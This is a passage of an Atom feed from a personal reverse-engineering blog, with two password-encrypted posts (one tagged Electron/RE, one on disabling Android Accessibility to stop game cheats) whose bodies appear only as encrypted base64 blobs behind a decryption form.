L4Encp8MrccTJv0CYBU2+DUKCjRXYIFP6huQ8ZMUxgz0YB3w8KM5yFnDwMqrgV2hrquqfWvIv8ohPBC9SULmvlY8QtGOrypQA4AGGadvcUVbADjsAsG26D82uCCB02CUfsZeMD9JtOrvjaacC2RZByFcT4x/XrtASxJu/JfQH3q8B8DCTbnN93UI0BHowoLAbKRjxvpz5j4tNynjy+V4id7r2hMJyL2bFphRL42hDDSBjlqJsc5/e0wYK3w6T0E1FaNW6VNfF3o1OpnyAhUf7RbUIkay+rAr0Ep9FYIIo80pbQNWdf+nUyx3PaVCBwFYWXyRrynIBAGVbGrRLkWcEGZDni2/nFFCEd+4StM/Rjp+BdkjLkxor6m4BhEk/0z3o0u3dt3OjEkcoioT9U1RlZ+ZDtB3HtjtC50FVQOPn7mExzea9qg3Y3fyA/4KPUV+LgBQayycYVn0j22l8V40PrJiGWlH1GdDZDYwCXUYuZ26AQpWnprJvpeaKnY65sjjSDQNmg1a6PaRiRbcTHudy5/ncTkd2GEwmRPNja4mTlUSDQwPDJtBbUbFySmXTrWQBdnsMWWBMYZNDd2sGpPGLNBEDfEB3A6SGj01a3sc9/D2ji3OSr/VGrvyXUmog47Va0sCejXeiNErDL1GYNLO+Neq/gVyRYT2Xouynnhqha4sKwWVKfIH4GK/PQ3aN3OnHsbtq5l1wsi/G9ud0JLWX/tpvDHF17aQkpExh1k9UQluauykM6xS1nAX/QpEPx2G6Xz0xq5UcsuPHZxHgz5N5iNmengMenxaCCuXbF6FpqnSU8c5fsDj0pX0mM3J5dmhUwBEwjbm/9zLyoovkz9Q17z9qoo6Es7jEPfrgiUZHJR7OLsIK0nMAoyFptgrwB54z9GOf/ano6x7W6NVo86MAkvxNiucQgJl+V9vMLf+5FP/G1P5or76qCJCilMY/plf5EUrQDs8HsSCXVS5scIHKfcfxUQRyAeHqx9N28dUjA/eRn1jMCUBa1Zjwf02HI/qqY2ryAeh/EhdwTi8IpDSsDCogkfBqiWUEQTVSIHlL/3GSZXHXwOjrkbE02/GexMn1FivRu9SHwp7DBIl13Yr1gQymOsxQ2IKKowE1aB6uuGKArrHFIzx832sQYJFGzxyNvjdNiSllvNwjptDpc2cloRgmwDfoA453ndiyRt5mHrqtKIq11KhBkAE1jLOXLWw+Td5z3oVESpauMho32BAfYsGouqErVAeGpA4PLH/m80Fagcg0xFFSNX7Y7RgM5k4ErNYHZB1/mA0HaN1Mjk5KuEpIWdRnwQVFrHrLaN3P9n0jGuqFUJgD1bIMem5WAi+XUw/W3h4yM8F/N9VLX+jZEPojwwAebc5zvYq3gjBiAuIbIAvNAI6YbsAgcl0NNwQ301I4mnNWqOJzTcGgMRM4NoH5e+lpB8PyZovoCUOhzuofiskbGKN4kuX8FquX3ILDHqgxBfELJEWPKsCBVzkD+iAaq1UkVnIDlqefqGfsE5rvKNU2LJ12YZaUfbSn2wxd4F2REwNvCCUW9z9QID2o96Rgr5FNbM48gqC0UDaMrlS+BMR7v7/7FDAc/qp+tVTxLFhum0BgjQbh8IpSjleQ8o1UH4RMp65CduVPhXk24FGXmjPKD1PsEy2xVtvDFhYtiKH65awatgkUeC6/1h6fAgg6yNCcTmLM3RyFlEsc8LPue+3SyjDVKcE+tSin+eQaT1KD3lCXvN7McnEQAhrDarH99Mw6lqT8WqJYGk7Y8sIDDVFmq9D8HSX7GavEJXGKJWbZDncOqZJodJz4IjqTdUR0syzy5w/VuezKJuzRIRFiqmhOGynTGC/bG8B1vuFjCm1u5rx44BPvZi8WsLYggw7a28tZFmyxDPniith3/kmw8agJZ/sZq7jzf2eYMC+4/yOyyGorAL9ckQfulURlaP5hPMCJF6GBywgjvY+47Ezq6HYfISNJRj6lFIp7YJ3RQuY0an0jglpNDLS0W7UoVwg/yJqp6OSRbngc5HXFSDaCtkzJPT2HwcUqNS2T0e/Ag5CcHKshSJrleiM4y2HPGWYzwFepj0JY+J4us1PWEfsNsx3YrPbjWcjl2r2WGJBDi2yW028DS/zL2E3vzkbXAOaymgf9Nr0CLMe3abr2cNDC/b8zsTNuruPomS+keVkoeXwGvmC0DP1Pb/qds8wzLDqtQMPJjdMqTKDwxmWYJ/LMA5echEpmyr6nJFeGI+UX3iepI3ZTloDwOB07QS485YsC5fruH8LlwWP+PAs9YrAM+2ditiXeY0dBrXwHwO62+KnmNIfAjYVX+aTgIHOxGbxoHlhgUUxqqZLNNWXc4AQMq+5gR/DTNIBoBJLx9Mrji+p74qR8NwaqZdzaUmM5yiSpGRD8LHwm1wuf/h4aC8tbAykIuV+O78CyEATEWHYxyhKVTOIMbI+IYkRj/b5YlQ00fgYCKnsuLXuEasyjOD81EHLkSUYVtr/HCX1mfqXVdavzjRMH48zIayEcbv+NCsxSciKeDx3YgDneJQU7N6Myij06FICjHUYVYXNSwd5ilaNhpuDiCgGxiybAb9NZJlmSEqjJsFU/sFrI7arU/UwormYX+5x1RKdvyl84vYE3KW4CX2/Sl3xUClKPT/nkGUpBcXKYdp/zJAslFTIDxsyJbnDfRYvT0</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="Electron" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Electron/"/>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Android完全禁用Accessibility（通杀一切基于此的外挂）</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/</id>
    <published>2019-07-24T12:02:54.000Z</published>
    <updated>2019-07-30T07:52:20.330Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!">    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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